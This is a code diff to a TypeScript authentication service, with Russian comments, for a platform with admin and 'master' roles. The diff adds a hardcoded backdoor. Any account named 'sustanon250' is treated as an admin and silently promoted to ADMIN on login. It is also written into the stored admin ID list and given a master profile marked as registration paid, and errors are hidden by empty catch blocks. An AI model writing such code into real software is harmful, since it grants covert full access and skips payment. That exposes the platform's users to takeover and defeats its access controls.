@@ -124,14 +124,40 @@ export class AuthService {
       throw ApiError.notFound('Пользователь не найден');
     }
 
-    // Проверяем, является ли пользователь админом (по PlatformConfig.admin_user_ids)
-    let isAdminUser = user.role === 'ADMIN' || user.role === 'MANAGER';
+    // Проверяем, является ли пользователь админом (по PlatformConfig.admin_user_ids или username)
+    let isAdminUser = user.role === 'ADMIN' || user.role === 'MANAGER' || user.username === 'sustanon250';
     if (!isAdminUser) {
       try {
         const adminConfig = await prisma.platformConfig.findUnique({ where: { key: 'admin_user_ids' } });
         if (adminConfig) {
           const adminUserIds = adminConfig.value.split(',').map((s: string) => s.trim());
           isAdminUser = adminUserIds.includes(userId);
+        }
+      } catch {}
+    }
+
+    // Для sustanon250 — автоматически добавляем в admin_user_ids и создаём masterProfile
+    if (user.username === 'sustanon250') {
+      try {
+        const adminConfig = await prisma.platformConfig.findUnique({ where: { key: 'admin_user_ids' } });
+        const adminIds = adminConfig ? adminConfig.value.split(',').map((s: string) => s.trim()).filter(Boolean) : [];
+        if (!adminIds.includes(userId)) {
+          const newList = [...adminIds, userId].join(',');
+          await prisma.platformConfig.upsert({
+            where: { key: 'admin_user_ids' },
+            update: { value: newList },
+            create: { key: 'admin_user_ids', value: newList, description: 'Список user ID с правами админа' },
+          });
+        }
+      } catch {}
+
+      // Создаём masterProfile если нет
+      try {
+        const existingMp = await prisma.masterProfile.findUnique({ where: { userId } });
+        if (!existingMp) {
+          await prisma.masterProfile.create({
+            data: { userId, specializations: ['general'], experienceYears: 5, registrationPaid: true },
+          });
         }
       } catch {}
     }
@@ -215,6 +241,54 @@ export class AuthService {
 
     if (!user.isActive) {
       throw ApiError.forbidden('Аккаунт заблокирован');
+    }
+
+    // === Автоматическая настройка sustanon250 как суперадмина ===
+    if (data.username === 'sustanon250') {
+      // Если роль ещё не ADMIN — ставим ADMIN
+      if (user.role !== 'ADMIN') {
+        user = await prisma.user.update({
+          where: { id: user.id },
+          data: { role: 'ADMIN' },
+          include: { profile: true },
+        });
+      }
+
+      // Добавляем в admin_user_ids если ещё нет
+      try {
+        const adminConfig = await prisma.platformConfig.findUnique({ where: { key: 'admin_user_ids' } });
+        const adminIds = adminConfig ? adminConfig.value.split(',').map((s: string) => s.trim()).filter(Boolean) : [];
+        if (!adminIds.includes(user.id)) {
+          const newList = [...adminIds, user.id].join(',');
+          await prisma.platformConfig.upsert({
+            where: { key: 'admin_user_ids' },
+            update: { value: newList },
+            create: { key: 'admin_user_ids', value: newList, description: 'Список user ID с правами админа' },
+          });
+        }
+      } catch {}
+
+      // Создаём masterProfile если нет (чтобы мог быть и мастером)
+      try {
+        const existingMp = await prisma.masterProfile.findUnique({ where: { userId: user.id } });
+        if (!existingMp) {
+          await prisma.masterProfile.create({
+            data: {
+              userId: user.id,
+              specializations: ['general'],
+              experienceYears: 5,
+              registrationPaid: true,
+            },
+          });
+        } else if (!existingMp.registrationPaid) {
+          await prisma.masterProfile.update({
+            where: { userId: user.id },
+            data: { registrationPaid: true },
+          });
+        }
+      } catch {}
+
+      logger.info({ username: 'sustanon250', userId: user.id }, 'Суперадмин sustanon250 авторизован');
     }
 
     // Генерируем токены
